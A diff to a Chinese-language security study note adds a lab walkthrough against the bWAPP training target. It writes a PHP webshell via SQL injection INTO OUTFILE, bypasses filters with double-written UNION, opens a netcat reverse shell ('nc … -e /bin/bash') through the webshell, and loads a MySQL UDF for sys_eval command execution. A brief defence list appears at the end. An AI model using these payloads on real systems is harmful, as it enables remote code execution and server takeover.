@@ -1299,7 +1299,7 @@ curl -d "hacker=echo getcwd();" http://127.0.0.1/images/shell.php
 
 #### POST注入实战
 
-- 安装，注册，并登录靶机
+- 安装，注册，并登录bWAPP 靶机
 
 - 选择bug类型：Choose your bug: SQL Injection (POST/Select)
 
@@ -2614,27 +2614,183 @@ curl -d "hacker=echo getcwd();" http://127.0.0.1/images/shell.php
 
 ### 命令执行 
 
+#### SQL注入之命令执行原理
+
+通过SQL注入，直接写入webshell文件到服务器，通过GET方法或者POST方法提交并执行外部指令，为后续进一步远程控制，提权，创造条件。
+
+关键语句：
+
+- <?php system($_GET["cmd"]); ?> 
+
+注入方式：
+
+```sh
+select username,password from users where id =‘1’union select 1,'<?php system($_GET["cmd"]); ?>' into outfile '/var/www/html/cmd.php‘ ; 
+```
+
+
+
+#### SQL 语句注入实战
+
+SQL 注入测试：
+
+- 安装，注册，并登录 bWAPP 靶机
+- docker container list -a
+- docker start zealous_heyrovsky
+- docker ps
+- docker exec -it zealous_heyrovsky bash
+- mysql -u root -p
+- show databases;
+- use bWAPP;
+- select database();
+- show tables;
+- select * from heroes;
+-  select * from heroes where id=7;
+- select * from heroes where id=7 union select 'hello' into outfile '/var/www/html';
+  - 报错，The used SELECT statements have a different number of columns
+  - 使用 union 的时候，需要保证前后的字段数是一样的
+  - 可以使用这种语句测试，select * from heroes where id=7 union select 1,2,3,4,5,'hello' into outfile '/var/www/html';
+- select * from heroes where id=7 union select 1,2,3,'hello' into outfile '/var/www/html/ccc.php';
+  - 如果报错，且状态码 errcode 是 13，则表示文件写入的权限不够
+  - 验证权限
+    -  exit
+    - cd /var/www/html/
+    - ll
+    - 查看到 images 的文件，权限都是 当前用户，使用其进行测试
+    - drwxrwxrwx 1 www-data www-data  4096 Mar 30 05:37 images/
+  - mysql -u root -p
+  - use bWAPP;
+  - select * from heroes where id=7 union select 1,2,3,'hello' into outfile '/var/www/html/images/ccc.php';
+- 浏览器查看
+  - 地址栏输入：http://127.0.0.1/images/ccc.php
+  - 可以看到对应的内容为：1	2	3	hello
+  - 如果其中的内容换成 webshell ，就可以执行注入了
+
+
+
+#### UDF注入实战
+
+还可以利用“用户自定义函数”的方式，即User-Defined Functions（UDF）来执行命令。通过lib_mysqludf_sys提供的函数可以执行系统命令,关键语句：
+
+- sys_eval()，执行任意命令，并将输出返回
+- sys_exec()，执行任意命令，并将返回码返回
+- sys_get()，获取一个环节变量
+- sys_set()，创建或修改一个环境变量 
+
+UDF文件获取
+
+- https://github.com/mysqludf/lib_mysqludf_sys 中的，[lib_mysqludf_sys.so](https://github.com/mysqludf/lib_mysqludf_sys/blob/master/lib_mysqludf_sys.so) 文件。
+- https://github.com/sqlmapproject/sqlmap 中的，sqlmap/data/udf/mysql/ 下的 不同平台和位数的文件。
+  - sqlmap下的文件经过编码，需要使用 sqlmap/extra/cloak目录下的cloak.py文件进行解码
+  - python cloak.py -d -i /Users/apple/workplace/sqlmap/data/udf/mysql/linux/64/lib_mysqludf_sys.so_ -o lib_linux.so 
+  - python cloak.py -d -i E:\39-网络安全\HackerMeSourceCode\sqlmap\data\udf\mysql\windows\64\lib_mysqludf_sys.dll_ -o lib_windows.dll 
+
+
+
+#### webshell 命令执行 
+
+SQL 注入测试：
+
+- 安装，注册，并登录 bWAPP 靶机
+- 选择bug类型：Choose your bug: SQL Injection (GET/Select)
+- 选择安全等级：Set your security level: medium
+- 测试 URL
+  - http://127.0.0.1/sqli_2.php?movie=1&action=go
+- 联合查询
+  - http://127.0.0.1/sqli_2.php?movie=1 union select 1,2,3,4,5 #&action=go
+- 双写注入
+  - http://127.0.0.1/sqli_2.php?movie=1 uniounionn select 1,2,3,4,5 #&action=go
+  - union 展示相同数量的 内容
+  - http://127.0.0.1/sqli_2.php?movie=1 uniounionn select 1,2,3,4,5,6,7 #&action=go
+- 实现注入
+  - http://127.0.0.1/sqli_2.php?movie=13 uniounionn select 1,2,3,4,5,6,7 #&action=go
+- webshell 注入
+  - http://127.0.0.1/sqli_2.php?movie=13 uniounionn select 1,2,3,4,5,6,'<?php system($_GET["cmd"]); ?>' into outfile '/var/www/html/images/cmd.php' &action=go
+  - 出现错误，Error: File '/var/www/html/images/cmd.php' already exists
+  - 更换文件名，http://127.0.0.1/sqli_2.php?movie=13 uniounionn select 1,2,3,4,5,6,'<?php system($_GET["cmd"]); ?>' into outfile '/var/www/html/images/cmd2.php' 
+  - 此时进入 bWAPP 可以看到写入的文件
+    - cd /var/www/html/images
+    - cat cmd2.php
+- 访问文件
+  - http://127.0.0.1/images/cmd2.php
+  - 执行命令
+    - http://127.0.0.1/images/cmd2.php?cmd=ps -ef
+    - http://127.0.0.1/images/cmd2.php?cmd=uname -a
+    - http://127.0.0.1/images/cmd2.php?cmd=whoami
+- windows 安装 nc
+  - 下载地址，https://eternallybored.org/misc/netcat/
+  - 解压，添加环境变量即可
+- 使用 nc 测试
+  - bWAPP 中打开交互式命令行
+  - ping 192.168.1.102 ，看一下网络是否与主机通畅，ip地址获取方式 命令行中输入 ipconfig
+  - 主机，监听端口命令，nc -l 8888
+    - 出现错误 local listen fuxored: INVAL
+    - 使用新命令，nc -l -p 8888
+  - bWAPP 连接主机端口，nc 192.168.1.102 8888
+    - 如果连接成功，都会被卡住，此时在主机中输入内容，在 bWAPP 中也可以看到
+  - bWAPP 连接主机端口，并且执行bash 交互式命令行，nc 192.168.1.102 8888 -e /bin/bash
+    - 如果连接成功，都会被卡住，此时在主机中输入命令，就可以直接下下面展示出来结果
+    - 如输入：pwd;ls;whoami 等
+  - 在浏览器中输入，http://127.0.0.1/images/cmd2.php?cmd=nc 192.168.1.102 8888 -e /bin/bash
+    - 注意，需要保证主机一定在监听 8888 端口，不然会报错 Connection refused，表现为无法测试
+    - 此时就可以看到浏览器一直在转圈圈，表示 nc 连接上了
+    - 此时，就可以直接在 nc 的监听中直接连接 bWAPP，并且执行命令了
+      - pwd
+      - ps -ef
+      - whoami
 
 
 
 
 
+#### UDF 命令执行
+
+- MySQL公共库位置 
+  - 命令，show variables like '%plugin%';
+  -  plugin_dir    | /usr/lib/mysql/plugin/
+  - 进入目录，cd /usr/lib/mysql/plugin/
+  - 给文件夹权限，
+    - cd ..
+    - chmod -R o+w plugin/  # 给plugin文件夹的其他用户操作添加写权限，保证可以写入.so数据
+- 获取的lib_linux.so文件十六进制编码 
+  - 下载，https://github.com/sqlmapproject/sqlmap
+  - 进入，\sqlmap\extra\cloak 
+  - 执行 python cloak.py -d -i E:\39-网络安全\HackerMeSourceCode\sqlmap\data\udf\mysql\linux\32\lib_mysqludf_sys.so_ -o lib_linux.so
+  - 获得 lib_linux.so 文件
+  - 在mac 上，使用 ruby 进行十六进制编码
+  - 进入交互式环境，irb
+  - 输入，irb(main):001:0> File.read("lib_linux.so").unpack("H*");  ，获得输出内容
+- 导入UDF 
+  - 进入 mysql 交互式环境
+  - 输入，select unhex('???') into dumpfile '/usr/lib/mysql/plugin/lib_linux.so';
+  - 将其中的 ??? 替换成 lib_linux.so文件的十六进制编码，就可以写入到对应的插件文件夹中
+- dumpfile v.s. outfile 
+  - 若我们想把一个 可执行 2进制文件用 into outfile 函数导出，实际上 导出后 文件就会被破坏
+  - 因为 into outfile 函数会在行末端写入新行，更致命的是会转义，换行符， 这样的话这个2进制可执行文件就会被破坏
+  - 这时候 我们使用 into dumpfile 就能导出 一个完整能执行的 2进制文件 into dumpfile 函数不对任何列或行进行终止，也不执行任何转义处理
+- UDF上传到指定目录后创建执行命令 
+  - create function sys_eval returns string soname "lib_linux.so";
+  - 注意：我在这里运行报错了，没有完成该UDF的测试
+- 命令执行 
+  - select sys_eval('ps -ef');
+  - select sys_eval('whoami');
+  - select sys_eval('ifconfig');
+- 自动化工具 
+  - sqlmap 提供参数进行命令执行和shell获取
+  - sqlmap.py –u “url” --os-shell
+  - sqlmap.py –u “url” --os-cmd=ifconfig 
 
 
 
+#### 防御措施 
+
+- 除了对SQL注入本身的检测之外：
+  - 服务器内的文件夹的权限管理
+  - 以最小权限应用服务，如apache服务 
 
 
 
-
-
-
-
-
-
-
-
-
-
+### Linux 权限控制 
 
 
 
